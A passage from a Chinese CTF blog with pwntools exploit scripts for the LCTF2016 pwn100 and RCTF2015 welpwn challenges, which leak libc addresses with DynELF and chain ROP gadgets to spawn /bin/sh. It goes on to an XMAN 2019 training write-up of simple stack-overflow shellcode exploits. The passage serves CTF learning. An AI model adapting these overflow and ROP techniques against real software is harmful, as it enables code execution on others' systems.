class="line">payload1 += p32(bssaddress)</span><br><span class="line">payload1 += p32(<span class="number">8</span>)</span><br><span class="line">payload1 += p32(systemAddress) + p32(vulnaddress) + p32(bssaddress)</span><br><span class="line">p.send(payload1)</span><br><span class="line">p.send(<span class="string">'/bin/sh'</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<p><strong>LCTF2016-pwn100</strong></p>
<p>本题是64位linux下的二进制程序，无cookie，也存在很明显的栈溢出漏洞，且可以循环泄露，符合我们使用DynELF的条件，但和上一题相比，存在两处差异：</p>
<p><strong>1）64位linux下的函数需要通过rop链将参数传入寄存器，而不是依靠栈布局；</strong></p>
<p><strong>2）puts函数与write函数不同，不能指定输出字符串的长度。</strong></p>
<p>根据上文给出的解决方法，构造利用脚本如下。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line">p = process(<span class="string">"./pwn100"</span>)</span><br><span class="line">elf = ELF(<span class="string">"./pwn100"</span>)</span><br><span class="line">readplt = elf.symbols[<span class="string">'read'</span>]</span><br><span class="line">readgot = elf.got[<span class="string">'read'</span>]</span><br><span class="line">putsplt = elf.symbols[<span class="string">'puts'</span>]</span><br><span class="line">putsgot = elf.got[<span class="string">'puts'</span>]</span><br><span class="line">mainaddress =   <span class="number">0x4006b8</span></span><br><span class="line">startaddress =   <span class="number">0x400550</span></span><br><span class="line">poprdi =     <span class="number">0x400763</span></span><br><span class="line">pop6address  =  <span class="number">0x40075a</span>   </span><br><span class="line">movcalladdress = <span class="number">0x400740</span></span><br><span class="line">waddress =     <span class="number">0x601000</span> <span class="comment">#可写的地址，bss段地址在我这里好像不行，所以选了一个别的地址，应该只要不是readonly的地址都可以  </span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">leak</span><span class="params">(address)</span>:</span></span><br><span class="line">  count = <span class="number">0</span></span><br><span class="line">  data = <span class="string">''</span></span><br><span class="line">  payload = <span class="string">"A"</span> * <span class="number">64</span> + <span class="string">"A"</span> * <span class="number">8</span></span><br><span class="line">  payload += p64(poprdi) + p64(address)</span><br><span class="line">  payload += p64(putsplt)</span><br><span class="line">  payload += p64(startaddress)</span><br><span class="line">  payload = payload.ljust(<span class="number">200</span>, <span class="string">"B"</span>)</span><br><span class="line">  p.send(payload)</span><br><span class="line">  <span class="keyword">print</span> p.recvuntil(<span class="string">'bye~n'</span>)</span><br><span class="line">  up = <span class="string">""</span></span><br><span class="line">  <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    c = p.recv(numb=<span class="number">1</span>, timeout=<span class="number">0.5</span>)</span><br><span class="line">    count += <span class="number">1</span></span><br><span class="line">    <span class="keyword">if</span> up == <span class="string">'n'</span> <span class="keyword">and</span> c == <span class="string">""</span>:</span><br><span class="line">      data = data[:<span class="number">-1</span>]</span><br><span class="line">      data += <span class="string">"x00"</span></span><br><span class="line">      <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">      data += c</span><br><span class="line">    up = c</span><br><span class="line">  data = data[:<span class="number">4</span>]</span><br><span class="line">  log.info(<span class="string">"%#x =&gt; %s"</span> % (address, (data <span class="keyword">or</span> <span class="string">''</span>).encode(<span class="string">'hex'</span>)))</span><br><span class="line">  <span class="keyword">return</span> data</span><br><span class="line">d = DynELF(leak, elf=ELF(<span class="string">'./pwn100'</span>))</span><br><span class="line">systemAddress = d.lookup(<span class="string">'__libc_system'</span>, <span class="string">'libc'</span>)</span><br><span class="line"><span class="keyword">print</span> <span class="string">"systemAddress:"</span>, hex(systemAddress)</span><br><span class="line"><span class="keyword">print</span> <span class="string">"-----------write /bin/sh to bss--------------"</span></span><br><span class="line">payload1 = <span class="string">"A"</span> * <span class="number">64</span> + <span class="string">"A"</span> * <span class="number">8</span></span><br><span class="line">payload1 += p64(pop6address) + p64(<span class="number">0</span>) + p64(<span class="number">1</span>) + p64(readgot) + p64(<span class="number">8</span>) + p64(waddress) + p64(<span class="number">0</span>)</span><br><span class="line">payload1 += p64(movcalladdress)</span><br><span class="line">payload1 += <span class="string">'x00'</span>*<span class="number">56</span></span><br><span class="line">payload1 += p64(startaddress)</span><br><span class="line">payload1 =  payload1.ljust(<span class="number">200</span>, <span class="string">"B"</span>)</span><br><span class="line">p.send(payload1)</span><br><span class="line"><span class="keyword">print</span> p.recvuntil(<span class="string">'bye~n'</span>)</span><br><span class="line">p.send(<span class="string">"/bin/shx00"</span>)</span><br><span class="line"><span class="keyword">print</span> <span class="string">"-----------get shell--------------"</span></span><br><span class="line">payload2 = <span class="string">"A"</span> * <span class="number">64</span> + <span class="string">"A"</span> * <span class="number">8</span></span><br><span class="line">payload2 += p64(poprdi) + p64(waddress)</span><br><span class="line">payload2 += p64(systemAddress)</span><br><span class="line">payload2 += p64(startaddress)</span><br><span class="line">payload2 =  payload2.ljust(<span class="number">200</span>, <span class="string">"B"</span>)</span><br><span class="line">p.send(payload2)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<p><strong>RCTF2015-welpwn</strong></p>
<p>本题也是64位linux下的二进制程序，无cookie，也存在明显的栈溢出漏洞，且可以循环泄露，符合我们使用DynELF的条件，与其他两题的区别主要在于利用过程比较绕。</p>
<p> 整个程序逻辑是这样的，main函数中，用户可以输入1024个字节，并通过echo函数将输入复制到自身栈空间，但该栈空间很小，使得栈溢出成为可能。由于复制过程中，以“x00”作为字符串终止符，故如果我们的payload中存在这个字符，则不会复制成功；但实际情况是，因为要用到上面提到的通用gadget来为write函数传参，故肯定会在payload中包含“x00”字符。</p>
<p> 这个题目设置了这个障碍，也为这个障碍的绕过提供了其他条件。即由于echo函数的栈空间很小，与main函数栈中的输入字符串之间只间隔32字节，故我们可以利用这一点，只复制过去24字节数据加上一个包含连续4个pop指令的gadget地址，并借助这个gadget跳过原字符串的前32字节数据，即可进入我们正常的通用gadget调用过程，具体脚本如下。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line">p = process(<span class="string">"./welpwn"</span>)</span><br><span class="line">elf = ELF(<span class="string">"welpwn"</span>)</span><br><span class="line">readplt = elf.symbols[<span class="string">"read"</span>]</span><br><span class="line">readgot = elf.got[<span class="string">"read"</span>]</span><br><span class="line">writeplt = elf.symbols[<span class="string">"write"</span>]</span><br><span class="line">writegot = elf.got[<span class="string">"write"</span>]</span><br><span class="line">startAddress =    <span class="number">0x400630</span></span><br><span class="line">popr12r13r14r15  = <span class="number">0x40089c</span></span><br><span class="line">pop6address    = <span class="number">0x40089a</span></span><br><span class="line">movcalladdress  = <span class="number">0x400880</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">leak</span><span class="params">(address)</span>:</span></span><br><span class="line">  <span class="keyword">print</span> p.recv(<span class="number">1024</span>)</span><br><span class="line">  payload = <span class="string">"A"</span> * <span class="number">24</span></span><br><span class="line">  payload += p64(popr12r13r14r15)</span><br><span class="line">  payload += p64(pop6address) + p64(<span class="number">0</span>) + p64(<span class="number">1</span>) + p64(writegot) + p64(<span class="number">8</span>) + p64(address) + p64(<span class="number">1</span>)</span><br><span class="line">  payload += p64(movcalladdress)</span><br><span class="line">  payload += <span class="string">"A"</span> * <span class="number">56</span></span><br><span class="line">  payload += p64(startAddress)</span><br><span class="line">  payload =  payload.ljust(<span class="number">1024</span>, <span class="string">"C"</span>)</span><br><span class="line">  p.send(payload)</span><br><span class="line">  data = p.recv(<span class="number">4</span>)</span><br><span class="line">  <span class="keyword">print</span> <span class="string">"%#x =&gt; %s"</span> % (address, (data <span class="keyword">or</span> <span class="string">''</span>).encode(<span class="string">'hex'</span>))</span><br><span class="line">  <span class="keyword">return</span> data</span><br><span class="line">dynelf = DynELF(leak, elf=ELF(<span class="string">"./welpwn"</span>))</span><br><span class="line">systemAddress = dynelf.lookup(<span class="string">"__libc_system"</span>, <span class="string">"libc"</span>)</span><br><span class="line"><span class="keyword">print</span> hex(systemAddress)</span><br><span class="line">bssAddress = <span class="number">0x601070</span></span><br><span class="line">poprdi =     <span class="number">0x4008a3</span></span><br><span class="line"><span class="keyword">print</span> p.recv(<span class="number">1024</span>)</span><br><span class="line">payload = <span class="string">"A"</span> * <span class="number">24</span></span><br><span class="line">payload += p64(popr12r13r14r15)</span><br><span class="line">payload += p64(pop6address) + p64(<span class="number">0</span>) + p64(<span class="number">1</span>) + p64(readgot) + p64(<span class="number">8</span>) + p64(bssAddress) + p64(<span class="number">0</span>)</span><br><span class="line">payload += p64(movcalladdress)</span><br><span class="line">payload += <span class="string">"A"</span> * <span class="number">56</span></span><br><span class="line">payload += p64(poprdi)</span><br><span class="line">payload += p64(bssAddress)</span><br><span class="line">payload += p64(systemAddress)</span><br><span class="line">payload = payload.ljust(<span class="number">1024</span>, <span class="string">"C"</span>)</span><br><span class="line">p.send(payload)</span><br><span class="line">p.send(<span class="string">"/bin/shx00"</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<p>由于该题目程序中也包含puts函数，故我们也可以用puts函数来实现leak，代码如下。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">leak</span><span class="params">(address)</span>:</span></span><br><span class="line">  count = <span class="number">0</span></span><br><span class="line">  data = <span class="string">''</span></span><br><span class="line">  <span class="keyword">print</span> p.recv(<span class="number">1024</span>)</span><br><span class="line">  payload = <span class="string">"A"</span> * <span class="number">24</span></span><br><span class="line">  payload += p64(popr12r13r14r15)</span><br><span class="line">  payload += p64(poprdi) + p64(address)</span><br><span class="line">  payload += p64(putsplt)</span><br><span class="line">  payload += p64(startAddress)</span><br><span class="line">  payload = payload.ljust(<span class="number">1020</span>, <span class="string">"B"</span>)</span><br><span class="line">  p.send(payload)</span><br><span class="line">  <span class="comment">#由于echo函数最后会输出复制过去的字符串，而该字符串是popr12r13r14r15，故我们可以将该gadget的地址作为判断输出结束的依据</span></span><br><span class="line">  <span class="keyword">print</span> p.recvuntil(<span class="string">"x9cx08x40"</span>) </span><br><span class="line">  up = <span class="string">""</span></span><br><span class="line">  <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    c = p.recv(<span class="number">1</span>)</span><br><span class="line">    count += <span class="number">1</span></span><br><span class="line">    <span class="keyword">if</span> up == <span class="string">'n'</span> <span class="keyword">and</span> c == <span class="string">"W"</span>: <span class="comment">#下一轮输出的首字母就是“Welcome”中的“W”</span></span><br><span class="line">      data = data[:<span class="number">-1</span>]</span><br><span class="line">      data += <span class="string">"x00"</span></span><br><span class="line">      <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">      data += c</span><br><span class="line">    up = c</span><br><span class="line">  data = data[:<span class="number">4</span>]</span><br><span class="line">  <span class="keyword">print</span> <span class="string">"%#x =&gt; %s"</span> % (address, (data <span class="keyword">or</span> <span class="string">''</span>).encode(<span class="string">'hex'</span>))</span><br><span class="line">  <span class="keyword">return</span> data</span><br></pre></td></tr></table></figure>


        
      
    </div>

    
    
    
      <footer class="post-footer">
          <div class="post-eof"></div>
        
      </footer>
  </div>
  
  
  
  </article>

    
       <article itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block home">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/08/06/XMAN-2019-╕ú╓▌-PWN-stackoverflowú¿╔╧ú⌐/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="ZERO-A-ONE">
      <meta itemprop="description" content="Resit much,Obey little">
      <meta itemprop="image" content="/images/avatar.gif">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="ZERO-A-ONE">
    </span>
      <header class="post-header">
        <h1 class="post-title" itemprop="name headline">
            
            <a href="/2019/08/06/XMAN-2019-╕ú╓▌-PWN-stackoverflowú¿╔╧ú⌐/" class="post-title-link" itemprop="url">XMAN-2019-福州-PWN-stackoverflow（上）</a>
          
        </h1>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>

              
                
              

              <time title="Created: 2019-08-06 07:34:45 / Modified: 22:38:02" itemprop="dateCreated datePublished" datetime="2019-08-06T07:34:45-07:00">2019-08-06</time>
            </span>
          
            

            
          

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <p>今天上午的讲的基础ROP十分有趣啊，从普通的栈溢出<code>simple_stackoverflow2</code>到ROP的<code>simple_stackoverflow2_nx</code>过渡十分自然，同样的代码，只因为开启了不同的防护手段，就有完全不同的攻击手法，就很有趣。</p>
<p>相关资料均可在GitHub上下载：<a href="https://github.com/suyucheng-lz/XMAN-2019-FZU" target="_blank" rel="noopener">https://github.com/suyucheng-lz/XMAN-2019-FZU</a></p>
<h2 id="simple-stackoverflow"><a href="#simple-stackoverflow" class="headerlink" title="simple_stackoverflow"></a>simple_stackoverflow</h2><p>先看看源代码</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">char</span> buf[<span class="number">1024</span>];</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">overflow</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> overflow[<span class="number">24</span>];</span><br><span class="line">    read(<span class="number">0</span>, buf, <span class="number">1023</span>);</span><br><span class="line">    read(<span class="number">0</span>, overflow, <span class="number">1023</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    setbuf(<span class="built_in">stdin</span>, <span class="number">0</span>);</span><br><span class="line">    setbuf(<span class="built_in">stdout</span>, <span class="number">0</span>);</span><br><span class="line">    setbuf(<span class="built_in">stderr</span>, <span class="number">0</span>);</span><br><span class="line">    overflow();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>IDA Pro反汇编出来的代码</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> __<span class="function">cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  setbuf(<span class="built_in">stdin</span>, <span class="number">0</span>);</span><br><span class="line">  setbuf(<span class="built_in">stdout</span>, <span class="number">0</span>);</span><br><span class="line">  setbuf(_bss_start, <span class="number">0</span>);</span><br><span class="line">  overflow();</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">overflow</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> buf; <span class="comment">// [esp+8h] [ebp-20h]</span></span><br><span class="line"></span><br><span class="line">  read(<span class="number">0</span>, &amp;::buf, <span class="number">0x3FF</span>u);</span><br><span class="line">  read(<span class="number">0</span>, &amp;buf, <span class="number">0x3FF</span>u);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>检查一下开启的保护措施</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">Arch:     i386-32-little</span><br><span class="line">RELRO:    Partial RELRO</span><br><span class="line">Stack:    No canary found</span><br><span class="line">NX:       NX disabled</span><br><span class="line">PIE:      No PIE (0x8048000)</span><br><span class="line">RWX:      Has RWX segments</span><br></pre></td></tr></table></figure>

<p>可以得知存在非常明显的栈溢出漏洞，只要第一次把shellcode写入全局的buf内存中，第二次通过栈溢出覆盖返回地址，使流程跳转到shellcode地址处执行shellcode代码即可。</p>
<p>通过计算得出栈的大小应该为<code>0x20 = 32</code>,然后因为32位机器加上4个字节即为<code>36</code>，也可以通过工具中的    <code>pattern.py</code>脚本计算得出。</p>
<p>使用<code>pattern.py</code>脚本首先生成字符串</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">syc@ubuntu:~/git/XMAN-2019-FZU/工具$ python pattern.py create 150</span><br><span class="line">Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9</span><br></pre></td></tr></table></figure>

<p>然后通过gdb调试程序，在输入点输入字符串，然后可以得到溢出的内存地点</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Legend: code, data, rodata, value</span><br><span class="line">Stopped reason: SIGSEGV</span><br><span class="line">0x41326241 in ?? ()</span><br></pre></td></tr></table></figure>

<p>然后通过脚本计算溢出点</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">syc@ubuntu:~/git/XMAN-2019-FZU/工具$ python pattern.py offset 0x41326241</span><br><span class="line">hex pattern decoded as: Ab2A</span><br><span class="line">36</span><br></pre></td></tr></table></figure>

<p>通过IDA Pro可以找到全局buf的地址为<code>0x804a060</code></p>
<p>则我们的payload可以这样写</p>
<p><code>36 * &#39;A&#39;+p32(0x804a060)</code></p>
<p>最终的Exploit</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">sh = process(<span class="string">'./simple_stackoverflow'</span>)</span><br><span class="line">shellcode = asm(shellcraft.sh())</span><br><span class="line">buf2_addr = <span class="number">0x804a060</span></span><br><span class="line">sh.sendline(shellcode)</span><br><span class="line">sh.sendline(<span class="number">36</span> * <span class="string">'A'</span> + p32(buf2_addr))</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>

<h2 id="simple-stackoverflow2"><a href="#simple-stackoverflow2" class="headerlink" title="simple_stackoverflow2"></a>simple_stackoverflow2</h2><p>先看看源代码</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">char</span> buf[<span class="number">1024</span>];</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">overflow</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> overflow[<span class="number">24</span>];</span><br><span class="line">    read(<span class="number">0</span>, buf, <span class="number">1023</span>);</span><br><span class="line">    read(<span class="number">0</span>, overflow, <span class="number">1023</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    setbuf(<span class="built_in">stdin</span>, <span class="number">0</span>);</span><br><span class="line">    setbuf(<span class="built_in">stdout</span>, <span class="number">0</span>);</span><br><span class="line">    setbuf(<span class="built_in">stderr</span>, <span class="number">0</span>);</span><br><span class="line">    overflow();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>然后看看IDA反汇编出来的代码</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> __<span class="function">cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  setbuf(<span class="built_in">stdin</span>, <span class="number">0</span>);</span><br><span class="line">  setbuf(<span class="built_in">stdout</span>, <span class="number">0</span>);</span><br><span class="line">  setbuf(<span class="built_in">stderr</span>, <span class="number">0</span>);</span><br><span class="line">  <span class="keyword">return</span> overflow();</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">overflow</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> buf; <span class="comment">// [esp+18h] [ebp-20h]</span></span><br><span class="line"></span><br><span class="line">  read(<span class="number">0</span>, &amp;buf, <span class="number">0x3FF</span>u);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>检查一下开启的保护措施</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">Arch:     i386-32-little</span><br><span class="line">RELRO:    Partial RELRO</span><br><span class="line">Stack:    No canary found</span><br><span class="line">NX:       NX disabled</span><br><span class="line">PIE:      No PIE (0x8048000)</span><br><span class="line">RWX:      Has RWX segments</span><br></pre></td></tr></table></figure>

<p>可以得知存在非常明显的栈溢出漏洞，但是这一次没有全局可写的buf地址，我们先看看我们有什么可以利用的点，可以进行ROP</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">syc@ubuntu:~/git/XMAN-2019-FZU/日程科目题目/PWN/simple_stackoverflow2$ objdump -R simple_stackoverflow2</span><br><span class="line"></span><br><span class="line">simple_stackoverflow2:     file format elf32-i386</span><br><span class="line"></span><br><span class="line">DYNAMIC RELOCATION RECORDS</span><br><span class="line">OFFSET   TYPE              VALUE </span><br><span class="line">08049ffc R_386_GLOB_DAT    __gmon_start__</span><br><span class="line">0804a040 R_386_COPY        stderr@@GLIBC_2.0</span><br><span class="line">0804a044 R_386_COPY        stdin@@GLIBC_2.0</span><br><span class="line">0804a060 R_386_COPY        stdout@@GLIBC_2.0</span><br><span class="line">0804a00c R_386_JUMP_SLOT   setbuf@GLIBC_2.0</span><br><span class="line">0804a010 R_386_JUMP_SLOT   read@GLIBC_2.0</span><br><span class="line">0804a014 R_386_JUMP_SLOT   __gmon_start__</span><br><span class="line">0804a018 R_386_JUMP_SLOT   __libc_start_main@GLIBC_2.0</span><br></pre></td></tr></table></figure>

<p>可以发现有一个read函数可以利用并且程序也没有开启地址随机化，这样我们只需要在溢出时跳转到read函数的地址调用read函数在buf读入shellcode，然后控制read函数的返回地址为buf继续执行shellcode就完成了</p>
<p>首先read函数<code>ssize_t read [1]  (int fd, void *buf, size_t count);</code></p>
<p>我们需要将第一个参数置为1，第二个参数为要写入的buf地址，第三个为buf的大小</p>
<p>于是就有<code>p32(0)+p32(buf2_addr)+p32(0x100)</code></p>
<p>然后因为还需要控制read函数的返回地址到buf处</p>
<p>于是就有<code>36 *&quot;a&quot; + p32(e.symbols[&quot;read&quot;]) + p32(buf2_addr)</code></p>
<p>最终的Exploit</p>
